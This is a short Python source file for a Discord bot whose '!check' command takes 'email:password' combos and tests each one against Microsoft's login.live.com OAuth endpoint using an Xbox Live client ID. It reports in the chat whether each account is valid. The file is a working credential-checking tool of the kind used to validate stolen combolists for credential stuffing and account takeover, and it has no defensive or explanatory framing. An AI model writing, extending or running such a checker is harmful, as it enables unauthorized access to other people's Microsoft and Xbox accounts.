from keep_alive import keep_alive
keep_alive()
import os
import discord
from discord.ext import commands
from dotenv import load_dotenv
import aiohttp

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

async def check_microsoft_account(email, password):
    url = "https://login.live.com/oauth20_token.srf"
    data = {
        "client_id": "00000000402b5328",
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
        "grant_type": "password",
        "username": email,
        "password": password
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=data) as resp:
            return resp.status == 200

@bot.command()
async def check(ctx, *, combo):
    try:
        email, password = combo.split(":")
    except ValueError:
        await ctx.send("Use format: `!check email:password`")
        return

    await ctx.send("Checking...")
    valid = await check_microsoft_account(email, password)
    if valid:
        await ctx.send(f"`{email}` is **valid**.")
    else:
        await ctx.send(f"`{email}` is **invalid**.")

bot.run(TOKEN)
